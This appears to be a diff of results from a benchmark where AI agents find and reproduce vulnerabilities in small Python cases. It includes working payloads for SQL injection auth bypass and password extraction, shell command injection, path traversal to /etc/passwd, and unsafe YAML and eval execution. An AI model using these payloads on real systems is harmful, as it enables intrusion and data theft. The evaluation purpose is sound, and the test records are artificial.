@@ -20,9 +20,9 @@
               "file": "submission.py",
               "function": "login"
             },
-            "reasoning": "The `login` function builds a SQL query using f-string interpolation, embedding the `username` and `password` parameters directly into the query string without any sanitization or parameterization. This allows an attacker to inject arbitrary SQL syntax. For example, passing `' OR '1'='1` as the password modifies the WHERE clause to always evaluate to true, returning all user rows and bypassing authentication. The fix would be to use parameterized queries with placeholders (`?`) and pass values as a tuple."
+            "reasoning": "The login function constructs a SQL query by directly interpolating user-supplied username and password into the query string via an f-string. No parameterized queries or input sanitization is used. An attacker can inject arbitrary SQL, such as \"' OR '1'='1\" to bypass authentication and retrieve all user records, or \"admin' --\" to log in as admin without a password."
           },
-          "reproduction_script": "import submission\n\n# The vulnerability: passing a crafted password injects SQL,\n# causing the query to return ALL users instead of just alice.\n# This demonstrates authentication bypass.\nresult = submission.login(\"alice\", \"' OR '1'='1\")\nprint(result)\n# Expected: [('alice', 'admin'), ('bob', 'user')]\n# Without injection, the correct result for alice/s3cret would be [('alice', 'admin')]",
+          "reproduction_script": "import submission\n\n# Test 1: Normal login with wrong password returns nothing\nprint(\"=== Normal login with wrong password ===\")\nprint(submission.login(\"alice\", \"wrongpassword\"))\n\n# Test 2: SQL Injection bypasses authentication entirely\nprint(\"\\n=== SQL Injection: bypass password check ===\")\nprint(submission.login(\"alice\", \"' OR '1'='1\"))\n\n# Test 3: SQL Injection with comment to login as bob without password\nprint(\"\\n=== SQL Injection: login as bob without password ===\")\nprint(submission.login(\"bob' --\", \"anything\"))\n\n# Test 4: SQL Injection dumps all users\nprint(\"\\n=== SQL Injection: extract all users ===\")\nprint(submission.login(\"' OR '1'='1' --\", \"anything\"))",
           "score": {
             "case_id": "CASE-01-sql-injection",
             "detection_correct": true,
@@ -40,7 +40,7 @@
           "outcome": {
             "passed": true,
             "reason": null,
-            "stdout": "[('alice', 'admin'), ('bob', 'user')]\n",
+            "stdout": "=== Normal login with wrong password ===\n[]\n\n=== SQL Injection: bypass password check ===\n[('alice', 'admin'), ('bob', 'user')]\n\n=== SQL Injection: login as bob without password ===\n[('bob', 'user')]\n\n=== SQL Injection: extract all users ===\n[('alice', 'admin'), ('bob', 'user')]\n",
             "stderr": "",
             "exit_code": 0,
             "timed_out": false,
@@ -48,7 +48,7 @@
           },
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 36956,
+          "tokens": 21535,
           "raw_predicted_type": "SQL Injection",
           "canonical_predicted_type": "SQL Injection"
         },
@@ -62,9 +62,9 @@
               "file": "submission.py",
               "function": "login"
             },
-            "reasoning": "The `login` function constructs a SQL query by directly interpolating the `username` and `password` parameters into the query string using an f-string (line: query = \"SELECT name, role FROM users \" f\"WHERE name = '{username}' AND pw = '{password}'\"). There is no sanitization, escaping, or parameterization of user-supplied inputs. An attacker can inject arbitrary SQL, bypassing authentication or extracting data. This is a textbook SQL injection vulnerability (CWE-89)."
+            "reasoning": "The login() function constructs SQL queries using f-strings with unsanitized user-supplied input (username and password). The query is built as: f\"WHERE name = '{username}' AND pw = '{password}'\". An attacker can inject arbitrary SQL, such as using \"' OR '1'='1\" to bypass authentication and return all user rows, or using UNION SELECT to extract sensitive data from other columns (e.g., passwords). This is a textbook SQL injection vulnerability (CWE-89)."
           },
-          "reproduction_script": "import submission\n\n# Inject SQL to bypass password authentication and retrieve all users\nresult = submission.login(\"alice\", \"' OR '1'='1\")\nprint(result)\n# Expected output: [('alice', 'admin'), ('bob', 'user')]\n# This shows that the attacker retrieved all rows without knowing any password.",
+          "reproduction_script": "import submission\n\n# 1. Normal login - returns just alice\nprint(\"Normal login:\", submission.login(\"alice\", \"s3cret\"))\n\n# 2. SQL injection bypasses authentication - returns all users\nprint(\"Auth bypass:\", submission.login(\"alice\", \"' OR '1'='1\"))\n\n# 3. Union injection extracts passwords\nprint(\"Password extraction:\", submission.login(\"' UNION SELECT name, pw FROM users --\", \"anything\"))",
           "score": {
             "case_id": "CASE-01-sql-injection",
             "detection_correct": true,
@@ -82,7 +82,7 @@
           "outcome": {
             "passed": true,
             "reason": null,
-            "stdout": "[('alice', 'admin'), ('bob', 'user')]\n",
+            "stdout": "Normal login: [('alice', 'admin')]\nAuth bypass: [('alice', 'admin'), ('bob', 'user')]\nPassword extraction: [('alice', 's3cret'), ('bob', 'hunter2')]\n",
             "stderr": "",
             "exit_code": 0,
             "timed_out": false,
@@ -90,7 +90,7 @@
           },
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 20434,
+          "tokens": 43434,
           "raw_predicted_type": "SQL Injection",
           "canonical_predicted_type": "SQL Injection"
         },
@@ -104,9 +104,9 @@
               "file": "submission.py",
               "function": "login"
             },
-            "reasoning": "The login function constructs a SQL query using f-string interpolation with unsanitized user inputs. The username and password parameters are directly embedded into the query string: f\"WHERE name = '{username}' AND pw = '{password}'\". This allows an attacker to inject arbitrary SQL, demonstrated by passing \"' OR '1'='1\" as the password, which returns all user rows instead of authenticating as a specific user."
+            "reasoning": "The login() function constructs a SQL query by directly interpolating the username and password parameters into the query string using Python f-strings. No parameterization, escaping, or input sanitization is applied. This allows an attacker to inject arbitrary SQL via the username or password fields. Demonstrated: (1) password ' OR '1'='1 returns all users instead of just the matching one, bypassing authentication; (2) username ' UNION SELECT name, pw FROM users -- extracts all passwords from the database."
           },
-          "reproduction_script": "import submission\n\n# SQL injection: bypass authentication and retrieve all users\nresult = submission.login(\"anything\", \"' OR '1'='1' --\")\nprint(result)\n# Should print [('alice', 'admin'), ('bob', 'user')] instead of authenticating a single user",
+          "reproduction_script": "import submission\n\n# Normal login - works correctly\nprint(\"=== Normal login ===\")\nprint(submission.login(\"alice\", \"s3cret\"))\n\n# SQL Injection: bypass authentication\nprint(\"\\n=== SQL Injection: Auth Bypass ===\")\nprint(submission.login(\"alice\", \"' OR '1'='1\"))\n\n# SQL Injection: extract sensitive data (passwords)\nprint(\"\\n=== SQL Injection: Data Exfiltration ===\")\nprint(submission.login(\"' UNION SELECT name, pw FROM users --\", \"anything\"))",
           "score": {
             "case_id": "CASE-01-sql-injection",
             "detection_correct": true,
@@ -124,7 +124,7 @@
           "outcome": {
             "passed": true,
             "reason": null,
-            "stdout": "[('alice', 'admin'), ('bob', 'user')]\n",
+            "stdout": "=== Normal login ===\n[('alice', 'admin')]\n\n=== SQL Injection: Auth Bypass ===\n[('alice', 'admin'), ('bob', 'user')]\n\n=== SQL Injection: Data Exfiltration ===\n[('alice', 's3cret'), ('bob', 'hunter2')]\n",
             "stderr": "",
             "exit_code": 0,
             "timed_out": false,
@@ -132,7 +132,7 @@
           },
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 20455,
+          "tokens": 36365,
           "raw_predicted_type": "SQL Injection",
           "canonical_predicted_type": "SQL Injection"
         }
@@ -175,7 +175,91 @@
               "file": "submission.py",
               "function": "ping"
             },
-            "reasoning": "The function ping() constructs a shell command via f-string interpolation: cmd = f\"echo pinging {host}\". The host parameter is never sanitized, and subprocess.check_output is called with shell=True. An attacker can inject arbitrary shell commands by including shell metacharacters in the host argument (e.g., '127.0.0.1; cat /etc/passwd'). The __main__ block even demonstrates this with a semicolon-separated command. This is a classic OS command injection vulnerability."
+            "reasoning": "The ping() function constructs a shell command via f-string interpolation (`f\"echo pinging {host}\"`) and executes it with `shell=True`. The `host` parameter is never sanitized, so an attacker can inject shell metacharacters (e.g., `;`, `&&`, `|`) to execute arbitrary OS commands. This is a classic CWE-78: Improper Neutralization of Special Elements used in an OS Command."
+          },
+          "reproduction_script": "import submission\n\n# Inject a command via the host parameter\npayload = \"127.0.0.1; echo REPRODUCTION_CANARY\"\noutput = submission.ping(payload)\nprint(output)",
+          "score": {
+            "case_id": "CASE-02-command-injection",
+            "detection_correct": true,
+            "type_correct": true,
+            "cwe_correct": true,
+            "function_correct": true,
+            "type_match": {
+              "predicted_raw": "OS Command Injection",
+              "predicted_canonical": "OS Command Injection",
+              "truth_raw": "OS Command Injection",
+              "truth_canonical": "OS Command Injection",
+              "matched": true
+            }
+          },
+          "outcome": {
+            "passed": true,
+            "reason": null,
+            "stdout": "pinging 127.0.0.1\nREPRODUCTION_CANARY\n\n",
+            "stderr": "",
+            "exit_code": 0,
+            "timed_out": false,
+            "resource_killed": false
+          },
+          "retry_count": 0,
+          "end_reason": "submitted",
+          "tokens": 20737,
+          "raw_predicted_type": "OS Command Injection",
+          "canonical_predicted_type": "OS Command Injection"
+        },
+        {
+          "attempt_index": 2,
+          "report": {
+            "is_vulnerable": true,
+            "vulnerability_type": "OS Command Injection",
+            "cwe": "CWE-78",
+            "location": {
+              "file": "submission.py",
+              "function": "ping"
+            },
+            "reasoning": "The ping() function constructs a shell command via f-string interpolation (f\"echo pinging {host}\") and executes it with subprocess.check_output(..., shell=True). The `host` parameter is never sanitized or validated, so an attacker-controlled value can inject arbitrary shell commands via shell metacharacters (e.g., `;`, `|`, `&&`). The example in __main__ even demonstrates this: ping(\"127.0.0.1; echo REDACTED\") would execute both the echo and the injected command."
+          },
+          "reproduction_script": "import submission\n\n# Command injection: inject 'echo REPRODUCTION_CANARY' via shell metacharacter ';'\nresult = submission.ping(\"127.0.0.1; echo REPRODUCTION_CANARY\")\nprint(result)",
+          "score": {
+            "case_id": "CASE-02-command-injection",
+            "detection_correct": true,
+            "type_correct": true,
+            "cwe_correct": true,
+            "function_correct": true,
+            "type_match": {
+              "predicted_raw": "OS Command Injection",
+              "predicted_canonical": "OS Command Injection",
+              "truth_raw": "OS Command Injection",
+              "truth_canonical": "OS Command Injection",
+              "matched": true
+            }
+          },
+          "outcome": {
+            "passed": true,
+            "reason": null,
+            "stdout": "pinging 127.0.0.1\nREPRODUCTION_CANARY\n\n",
+            "stderr": "",
+            "exit_code": 0,
+            "timed_out": false,
+            "resource_killed": false
+          },
+          "retry_count": 0,
+          "end_reason": "submitted",
+          "tokens": 30593,
+          "raw_predicted_type": "OS Command Injection",
+          "canonical_predicted_type": "OS Command Injection"
+        },
+        {
+          "attempt_index": 3,
+          "report": {
+            "is_vulnerable": true,
+            "vulnerability_type": "OS Command Injection",
+            "cwe": "CWE-78",
+            "location": {
+              "file": "submission.py",
+              "function": "ping"
+            },
+            "reasoning": "The ping function constructs a shell command using an f-string that directly interpolates the user-controlled host parameter, then executes it via subprocess.check_output with shell=True. This allows an attacker to inject arbitrary shell commands by including shell metacharacters (e.g., ;, |, &&) in the host argument. The injected command 'echo REPRODUCTION_CANARY' was successfully executed when passing '127.0.0.1; echo REPRODUCTION_CANARY' as the host."
           },
           "reproduction_script": "import submission\noutput = submission.ping(\"127.0.0.1; echo REPRODUCTION_CANARY\")\nprint(output)",
           "score": {
@@ -203,91 +287,7 @@
           },
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 24329,
-          "raw_predicted_type": "OS Command Injection",
-          "canonical_predicted_type": "OS Command Injection"
-        },
-        {
-          "attempt_index": 2,
-          "report": {
-            "is_vulnerable": true,
-            "vulnerability_type": "Command Injection",
-            "cwe": "CWE-78",
-            "location": {
-              "file": "submission.py",
-              "function": "ping"
-            },
-            "reasoning": "The ping function constructs a shell command by interpolating the user-controlled `host` parameter directly into a command string via f-string, then executes it with subprocess.check_output(..., shell=True). No sanitization or escaping is performed on the input. An attacker can inject arbitrary shell commands using shell metacharacters (e.g., `;`, `&&`, `|`, backticks, `$()`). The main guard already demonstrates injection with `127.0.0.1; echo REDACTED`, and I confirmed that `127.0.0.1; echo REPRODUCTION_CANARY` causes the injected echo to run."
-          },
-          "reproduction_script": "import submission\nresult = submission.ping(\"127.0.0.1; echo REPRODUCTION_CANARY\")\nprint(result)",
-          "score": {
-            "case_id": "CASE-02-command-injection",
-            "detection_correct": true,
-            "type_correct": true,
-            "cwe_correct": true,
-            "function_correct": true,
-            "type_match": {
-              "predicted_raw": "Command Injection",
-              "predicted_canonical": "OS Command Injection",
-              "truth_raw": "OS Command Injection",
-              "truth_canonical": "OS Command Injection",
-              "matched": true
-            }
-          },
-          "outcome": {
-            "passed": true,
-            "reason": null,
-            "stdout": "pinging 127.0.0.1\nREPRODUCTION_CANARY\n\n",
-            "stderr": "",
-            "exit_code": 0,
-            "timed_out": false,
-            "resource_killed": false
-          },
-          "retry_count": 0,
-          "end_reason": "submitted",
-          "tokens": 20168,
-          "raw_predicted_type": "Command Injection",
-          "canonical_predicted_type": "OS Command Injection"
-        },
-        {
-          "attempt_index": 3,
-          "report": {
-            "is_vulnerable": true,
-            "vulnerability_type": "OS Command Injection",
-            "cwe": "CWE-78",
-            "location": {
-              "file": "submission.py",
-              "function": "ping"
-            },
-            "reasoning": "The function `ping` constructs a shell command via f-string interpolation (`f\"echo pinging {host}\"`) and executes it with `subprocess.check_output(cmd, shell=True, text=True)`. The `host` parameter is inserted directly into the shell command without any sanitization or escaping, allowing an attacker to inject arbitrary shell commands. For example, passing `host = \"example.com; echo REPRODUCTION_CANARY\"` causes the shell to execute both `echo pinging example.com` and `echo REPRODUCTION_CANARY`. This is a textbook OS command injection (CWE-78)."
-          },
-          "reproduction_script": "import submission\n\n# Craft a malicious host string that injects an additional command\nmalicious_host = \"example.com; echo REPRODUCTION_CANARY\"\n\n# The vulnerable function will execute the injected command\noutput = submission.ping(malicious_host)\nprint(output)",
-          "score": {
-            "case_id": "CASE-02-command-injection",
-            "detection_correct": true,
-            "type_correct": true,
-            "cwe_correct": true,
-            "function_correct": true,
-            "type_match": {
-              "predicted_raw": "OS Command Injection",
-              "predicted_canonical": "OS Command Injection",
-              "truth_raw": "OS Command Injection",
-              "truth_canonical": "OS Command Injection",
-              "matched": true
-            }
-          },
-          "outcome": {
-            "passed": true,
-            "reason": null,
-            "stdout": "pinging example.com\nREPRODUCTION_CANARY\n\n",
-            "stderr": "",
-            "exit_code": 0,
-            "timed_out": false,
-            "resource_killed": false
-          },
-          "retry_count": 0,
-          "end_reason": "submitted",
-          "tokens": 20282,
+          "tokens": 24348,
           "raw_predicted_type": "OS Command Injection",
           "canonical_predicted_type": "OS Command Injection"
         }
@@ -322,28 +322,37 @@
       "attempts": [
         {
           "attempt_index": 1,
-          "report": null,
-          "reproduction_script": null,
+          "report": {
+            "is_vulnerable": true,
+            "vulnerability_type": "Path Traversal",
+            "cwe": "CWE-22",
+            "location": {
+              "file": "submission.py",
+              "function": "read_user_file"
+            },
+            "reasoning": "The read_user_file function uses os.path.join(BASE_DIR, filename) without any validation or sanitization of the filename parameter. This allows path traversal via two mechanisms: (1) absolute path bypass — if filename starts with '/', os.path.join ignores BASE_DIR entirely and uses the attacker-supplied absolute path directly; (2) relative traversal — '../' sequences in filename allow escaping BASE_DIR. Both allow an attacker to read arbitrary files outside the intended directory, such as /etc/passwd or /etc/hostname."
+          },
+          "reproduction_script": "import submission\n\n# Demonstrate the path traversal vulnerability.\n# The read_user_file function is supposed to restrict reads to /var/www/public,\n# but os.path.join allows an absolute path to bypass BASE_DIR entirely.\n\nprint(\"=== CWE-22 Path Traversal Proof ===\")\n\n# 1. Absolute path bypass: os.path.join('/var/www/public', '/etc/hostname') -> '/etc/hostname'\nresult = submission.read_user_file(\"/etc/hostname\")\nprint(\"Bypass via absolute path succeeded, hostname:\", result.strip())\n\n# 2. Read a sensitive system file\nresult = submission.read_user_file(\"/etc/passwd\")\nprint(\"Read /etc/passwd via absolute path, first line:\", result.split(\"\\n\")[0])\n\n# 3. Relative traversal (if BASE_DIR exists on this system)\ntry:\n    result = submission.read_user_file(\"../../../etc/hostname\")\n    print(\"Relative traversal succeeded, hostname:\", result.strip())\nexcept FileNotFoundError:\n    print(\"Relative traversal: path resolution failed (BASE_DIR does not exist in sandbox), but the joined path would be /var/www/public/../../../etc/hostname\")",
           "score": {
             "case_id": "CASE-03-path-traversal",
-            "detection_correct": false,
-            "type_correct": false,
-            "cwe_correct": false,
-            "function_correct": false,
+            "detection_correct": true,
+            "type_correct": true,
+            "cwe_correct": true,
+            "function_correct": true,
             "type_match": {
-              "predicted_raw": null,
-              "predicted_canonical": null,
+              "predicted_raw": "Path Traversal",
+              "predicted_canonical": "Path Traversal",
               "truth_raw": "Path Traversal",
               "truth_canonical": "Path Traversal",
-              "matched": false
+              "matched": true
             }
           },
           "outcome": null,
           "retry_count": 0,
-          "end_reason": "invalid_output",
-          "tokens": 28575,
-          "raw_predicted_type": null,
-          "canonical_predicted_type": null
+          "end_reason": "submitted",
+          "tokens": 47779,
+          "raw_predicted_type": "Path Traversal",
+          "canonical_predicted_type": "Path Traversal"
         },
         {
           "attempt_index": 2,
@@ -366,43 +375,34 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "steps",
-          "tokens": 43102,
+          "tokens": 43512,
           "raw_predicted_type": null,
           "canonical_predicted_type": null
         },
         {
           "attempt_index": 3,
-          "report": {
-            "is_vulnerable": true,
-            "vulnerability_type": "Path Traversal",
-            "cwe": "CWE-22",
-            "location": {
-              "file": "submission.py",
-              "function": "read_user_file"
-            },
-            "reasoning": "The function `read_user_file` takes a user-supplied `filename` and constructs a file path using `os.path.join(BASE_DIR, filename)` without any input sanitization or validation. This allows an attacker to supply `../` sequences to escape the intended `BASE_DIR` (/var/www/public) and read arbitrary files on the filesystem. The `__main__` block in the code even demonstrates this with `read_user_file('../../../../etc/hostname')`. There is no path normalization (e.g., `os.path.realpath`) or validation against the base directory."
-          },
-          "reproduction_script": "import submission\nimport os\n\n# Path traversal payload - escape BASE_DIR\nfilename = '../../../../etc/hostname'\n\n# Show the constructed path \npath = os.path.join(submission.BASE_DIR, filename)\nresolved = os.path.realpath(os.path.dirname(path) + '/../' * 4 + 'etc/hostname') if not os.path.exists(path) else path\nprint(f'BASE_DIR: {submission.BASE_DIR}')\nprint(f'Constructed path: {path}')\nprint(f'Escapes BASE_DIR: {not os.path.realpath(path).startswith(submission.BASE_DIR)}')\n\n# Attempt the traversal\ntry:\n    result = submission.read_user_file(filename)\n    print(f'READ RESULT: {result}')\nexcept FileNotFoundError:\n    print('Path traversal succeeded but target file does not exist in sandbox')\n    print(f'Attempted path: {path}')",
+          "report": null,
+          "reproduction_script": null,
           "score": {
             "case_id": "CASE-03-path-traversal",
-            "detection_correct": true,
-            "type_correct": true,
-            "cwe_correct": true,
-            "function_correct": true,
+            "detection_correct": false,
+            "type_correct": false,
+            "cwe_correct": false,
+            "function_correct": false,
             "type_match": {
-              "predicted_raw": "Path Traversal",
-              "predicted_canonical": "Path Traversal",
+              "predicted_raw": null,
+              "predicted_canonical": null,
               "truth_raw": "Path Traversal",
               "truth_canonical": "Path Traversal",
-              "matched": true
+              "matched": false
             }
           },
           "outcome": null,
           "retry_count": 0,
-          "end_reason": "submitted",
-          "tokens": 3220327,
-          "raw_predicted_type": "Path Traversal",
-          "canonical_predicted_type": "Path Traversal"
+          "end_reason": "steps",
+          "tokens": 44171,
+          "raw_predicted_type": null,
+          "canonical_predicted_type": null
         }
       ],
       "pass_rates": {
@@ -439,9 +439,9 @@
               "file": "submission.py",
               "function": "load_config"
             },
-            "reasoning": "The `load_config` function uses `yaml.load()` with `yaml.Loader`, which inherits from `UnsafeConstructor`. This allows YAML tags like `!!python/object/apply:` to construct arbitrary Python objects and execute arbitrary commands. An attacker who controls the YAML input can achieve remote code execution — confirmed by injecting `!!python/object/apply:os.system [\"echo REPRODUCTION_CANARY\"]`, which caused the shell command to execute."
+            "reasoning": "The function load_config uses yaml.load() with yaml.Loader, which is an unsafe loader that supports Python-specific YAML tags such as !!python/object/apply. This allows an attacker who controls the input YAML string to execute arbitrary Python code and shell commands. The safe alternative is yaml.safe_load() or yaml.load(..., Loader=yaml.SafeLoader)."
           },
-          "reproduction_script": "import submission\n\n# The crafted YAML payload triggers os.system to echo a canary,\n# proving arbitrary command execution through the vulnerable loader.\npayload = '!!python/object/apply:os.system [\"echo REPRODUCTION_CANARY\"]'\nsubmission.load_config(payload)",
+          "reproduction_script": "\nimport yaml\n\n# The vulnerability: yaml.Loader allows !!python/object/apply tags\n# which can execute arbitrary shell commands\npayload = \"!!python/object/apply:os.system ['echo REPRODUCTION_CANARY']\"\n\n# This is what submission.load_config does internally\nresult = yaml.load(payload, Loader=yaml.Loader)\n\n# The command executes and prints REPRODUCTION_CANARY to stdout\n# The return value is the exit code (0)\nprint(f\"Command exit code: {result}\")\n",
           "score": {
             "case_id": "CASE-04-unsafe-deserialization",
             "detection_correct": true,
@@ -459,7 +459,7 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 33080,
+          "tokens": 51205,
           "raw_predicted_type": "Deserialization of Untrusted Data",
           "canonical_predicted_type": "Unsafe Deserialization"
         },
@@ -473,9 +473,9 @@
               "file": "submission.py",
               "function": "load_config"
             },
-            "reasoning": "The function load_config uses yaml.load(text, Loader=yaml.Loader). yaml.Loader is PyYAML's unsafe loader that supports Python-specific YAML tags like !!python/object/apply, allowing an attacker who controls the YAML input to execute arbitrary Python code. This is a classic deserialization vulnerability (CWE-502). A safe alternative would be yaml.safe_load() or yaml.load(text, Loader=yaml.SafeLoader)."
+            "reasoning": "The function uses yaml.load() with yaml.Loader, which is PyYAML's unsafe loader. Unlike yaml.SafeLoader, yaml.Loader supports arbitrary YAML tags like !!python/object/apply, allowing an attacker to craft input that instantiates arbitrary Python objects and executes system commands. A malicious YAML string such as '!!python/object/apply:os.system [\"echo REPRODUCTION_CANARY\"]' triggers command execution on the host."
           },
-          "reproduction_script": "import submission\n\nmalicious = '''\n!!python/object/apply:os.system [\"echo REPRODUCTION_CANARY\"]\n'''\nsubmission.load_config(malicious)",
+          "reproduction_script": "\nimport submission\n\n# Crafted malicious YAML that executes 'echo REPRODUCTION_CANARY'\nmalicious_yaml = '!!python/object/apply:os.system [\"echo REPRODUCTION_CANARY\"]'\nresult = submission.load_config(malicious_yaml)\nprint(f\"Return value: {result}\")\n",
           "score": {
             "case_id": "CASE-04-unsafe-deserialization",
             "detection_correct": true,
@@ -493,7 +493,7 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 25984,
+          "tokens": 24894,
           "raw_predicted_type": "Deserialization of Untrusted Data",
           "canonical_predicted_type": "Unsafe Deserialization"
         },
@@ -501,35 +501,35 @@
           "attempt_index": 3,
           "report": {
             "is_vulnerable": true,
-            "vulnerability_type": "Insecure Deserialization",
+            "vulnerability_type": "Unsafe YAML deserialization leading to arbitrary code execution",
             "cwe": "CWE-502",
             "location": {
               "file": "submission.py",
               "function": "load_config"
             },
-            "reasoning": "The function uses yaml.load() with yaml.Loader, which supports unsafe YAML tags like !!python/object/apply that allow arbitrary code execution. When crafted YAML input is passed to load_config, it can execute arbitrary shell commands or Python code. The fix is to use yaml.safe_load() or yaml.load(text, Loader=yaml.SafeLoader) instead."
+            "reasoning": "The load_config function uses yaml.load() with yaml.Loader, which is not a safe loader in PyYAML 6.0.2. yaml.Loader supports YAML tags like !!python/object/apply: that allow constructing arbitrary Python objects and executing arbitrary code. An attacker can craft a YAML payload with such tags to achieve remote code execution. The safe alternative is yaml.SafeLoader or yaml.safe_load()."
           },
-          "reproduction_script": "import submission\n\n# Crafted YAML payload that executes 'echo REPRODUCTION_CANARY' via !!python/object/apply\nmalicious_yaml = '!!python/object/apply:os.system [\"echo REPRODUCTION_CANARY\"]'\n\n# The vulnerable function executes the shell command\nresult = submission.load_config(malicious_yaml)\nprint(f\"Return value: {result}\")",
+          "reproduction_script": "import submission\n\n# Craft a malicious YAML payload that executes an arbitrary shell command\nmalicious_yaml = \"\"\"\n!!python/object/apply:os.system [\"echo REPRODUCTION_CANARY\"]\n\"\"\"\n\n# Calling load_config with the payload triggers the code execution\nresult = submission.load_config(malicious_yaml)\nprint(\"Return value:\", result)",
           "score": {
             "case_id": "CASE-04-unsafe-deserialization",
             "detection_correct": true,
-            "type_correct": true,
+            "type_correct": false,
             "cwe_correct": true,
             "function_correct": true,
             "type_match": {
-              "predicted_raw": "Insecure Deserialization",
-              "predicted_canonical": "Unsafe Deserialization",
+              "predicted_raw": "Unsafe YAML deserialization leading to arbitrary code execution",
+              "predicted_canonical": "unsafe yaml deserialization leading to arbitrary code execution",
               "truth_raw": "Unsafe Deserialization",
               "truth_canonical": "Unsafe Deserialization",
-              "matched": true
+              "matched": false
             }
           },
           "outcome": null,
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 27596,
-          "raw_predicted_type": "Insecure Deserialization",
-          "canonical_predicted_type": "Unsafe Deserialization"
+          "tokens": 36880,
+          "raw_predicted_type": "Unsafe YAML deserialization leading to arbitrary code execution",
+          "canonical_predicted_type": "unsafe yaml deserialization leading to arbitrary code execution"
         }
       ],
       "pass_rates": {
@@ -538,7 +538,7 @@
           "total": 3
         },
         "type": {
-          "correct": 3,
+          "correct": 2,
           "total": 3
         },
         "cwe": {
@@ -560,49 +560,15 @@
           "attempt_index": 1,
           "report": {
             "is_vulnerable": true,
-            "vulnerability_type": "Code Injection (Eval Injection)",
-            "cwe": "CWE-95",
-            "location": {
-              "file": "submission.py",
-              "function": "calculate"
-            },
-            "reasoning": "The `calculate` function passes its `expression` argument directly to `eval()` without any sanitization or restriction. This allows an attacker to inject arbitrary Python code, including importing modules and executing shell commands. The `__main__` block even demonstrates this by passing `__import__('os').getcwd()` which executes successfully. Confirmed by injecting `__import__('os').system('echo REPRODUCTION_CANARY')` which printed the canary token, demonstrating full arbitrary command execution."
-          },
-          "reproduction_script": "import submission\n\n# Inject arbitrary shell command execution via eval\npayload = \"__import__('os').system('echo REPRODUCTION_CANARY')\"\nsubmission.calculate(payload)",
-          "score": {
-            "case_id": "CASE-05-code-injection",
-            "detection_correct": true,
-            "type_correct": true,
-            "cwe_correct": false,
-            "function_correct": true,
-            "type_match": {
-              "predicted_raw": "Code Injection (Eval Injection)",
-              "predicted_canonical": "Code Injection",
-              "truth_raw": "Code Injection",
-              "truth_canonical": "Code Injection",
-              "matched": true
-            }
-          },
-          "outcome": null,
-          "retry_count": 0,
-          "end_reason": "submitted",
-          "tokens": 24374,
-          "raw_predicted_type": "Code Injection (Eval Injection)",
-          "canonical_predicted_type": "Code Injection"
-        },
-        {
-          "attempt_index": 2,
-          "report": {
-            "is_vulnerable": true,
             "vulnerability_type": "Code Injection",
             "cwe": "CWE-94",
             "location": {
               "file": "submission.py",
               "function": "calculate"
             },
-            "reasoning": "The `calculate` function uses Python's built-in `eval()` on the `expression` string argument directly, with no sanitization or restriction. `eval()` executes arbitrary Python expressions, not just mathematical ones. An attacker can supply a string like `__import__('os').system('malicious command')` to execute arbitrary code on the host, as demonstrated by the second example in `__main__` and confirmed in the sandbox."
+            "reasoning": "The calculate() function passes user-provided expression strings directly to eval() without any sanitization or restriction. eval() can execute arbitrary Python code, including importing os and executing shell commands. The function's docstring says it evaluates arithmetic expressions, but eval() provides no such limitation — any Python expression, including calls to __import__('os').system(), will execute."
           },
-          "reproduction_script": "import submission\n# The calculate function passes user input directly to eval().\n# Crafted input executes an arbitrary shell command via os.system.\nresult = submission.calculate(\"__import__('os').system('echo REPRODUCTION_CANARY')\")\nprint(\"Result:\", result)",
+          "reproduction_script": "import submission\n\n# The calculate function uses eval() on user input with no sanitization.\n# This allows arbitrary code execution:\n# 1. Arbitrary Python code execution\nresult = submission.calculate(\"__import__('os').getcwd()\")\nprint(\"Code injection executed, cwd:\", result)\n\n# 2. Shell command execution\nsubmission.calculate(\"__import__('os').system('echo REPRODUCTION_CANARY')\")",
           "score": {
             "case_id": "CASE-05-code-injection",
             "detection_correct": true,
@@ -620,7 +586,41 @@
           "outcome": null,
           "retry_count": 0,
           "end_reason": "submitted",
-          "tokens": 24300,
+          "tokens": 39422,
+          "raw_predicted_type": "Code Injection",
+          "canonical_predicted_type": "Code Injection"
+        },
+        {
+          "attempt_index": 2,
+          "report": {
+            "is_vulnerable": true,
+            "vulnerability_type": "Code Injection",
+            "cwe": "CWE-94",
+            "location": {
+              "file": "submission.py",
+              "function": "calculate"
+            },
+            "reasoning": "The calculate() function passes user-supplied input directly to eval() with no sanitization or validation. eval() executes arbitrary Python expressions, allowing an attacker to import modules, access the filesystem, or execute shell commands. The vulnerability is demonstrated in the __main__ block itself, which shows that __import__('os').getcwd() executes successfully."
+          },
+          "reproduction_script": "import submission\n\n# Craft an input that executes a shell command via eval code injection\n# The payload uses os.popen to run 'echo REPRODUCTION_CANARY'\npayload = \"__import__('os').popen('echo REPRODUCTION_CANARY').read()\"\nresult = submission.calculate(payload)\nprint(result)",
+          "score": {
+            "case_id": "CASE-05-code-injection",
+            "detection_correct": true,
+            "type_correct": true,
+            "cwe_correct": true,
+            "function_correct": true,
+            "type_match": {
+              "predicted_raw": "Code Injection",
+              "predicted_canonical": "Code Injection",
+              "truth_raw": "Code Injection",
+              "truth_canonical": "Code Injection",
+              "matched": true
+            }
+          },
+          "outcome": null,
+          "retry_count": 0,
+          "end_reason": "submitted",
+          "tokens": 20124,
           "raw_predicted_type": "Code Injection",
           "canonical_predicted_type": "Code Injection"
         },
@@ -628,24 +628,24 @@
           "attempt_index": 3,
           "report": {
             "is_vulnerable": true,
-            "vulnerability_type": "Code Injection / Arbitrary Code Execution",
-            "cwe": "CWE-94",
+            "vulnerability_type": "Eval Injection / Code Injection",
+            "cwe": "CWE-95",
             "location": {
               "file": "submission.py",
               "function": "calculate"
             },
-            "reasoning": "The calculate() function passes user-supplied input directly to eval() without any sanitization or restriction. eval() can execute arbitrary Python code, including importing modules like os and executing system commands. The docstring claims it is for arithmetic expressions only, but there is no validation or safe evaluation mechanism (e.g., ast.literal_eval or a restricted namespace). An attacker can inject code like __import__('os').system('malicious command') to achieve arbitrary command execution."
+            "reasoning": "The calculate() function passes user-supplied input directly to Python's eval() with no sanitization, validation, or sandboxing. This allows an attacker to execute arbitrary Python code (e.g., __import__('os').popen('...').read()), leading to full remote code execution. CWE-95 covers improper neutralization of directives in dynamically evaluated code."
